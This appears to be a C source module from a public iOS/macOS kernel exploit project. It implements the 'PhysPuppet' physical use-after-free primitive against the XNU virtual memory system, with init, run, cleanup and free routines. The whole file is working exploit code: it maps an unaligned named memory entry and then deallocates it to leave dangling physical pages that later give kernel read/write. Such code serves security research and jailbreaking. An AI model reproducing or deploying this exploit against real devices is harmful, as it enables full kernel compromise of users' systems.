/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

const u64 physpuppet_vmne_size = pages(2) + 1;
const u64 physpuppet_vme_offset = pages(1);
const u64 physpuppet_vme_size = pages(2);

void physpuppet_init(struct kfd* kfd) {
    return;
}

void physpuppet_run(struct kfd* kfd) {
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        mach_port_t named_entry = MACH_PORT_NULL;
        assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));
        vm_address_t address = 0;
        assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));
        memset((void*)(address), 'A', physpuppet_vme_size);
        assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));
        assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;
        assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
        memset((void*)(address), 'A', physpuppet_vme_offset);
    }
}

void physpuppet_cleanup(struct kfd* kfd) {
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
        if ((puaf_page_uaddr == kread_page_uaddr) || (puaf_page_uaddr == kwrite_page_uaddr)) {
            continue;
        }
        assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

void physpuppet_free(struct kfd* kfd) {
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);
    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}
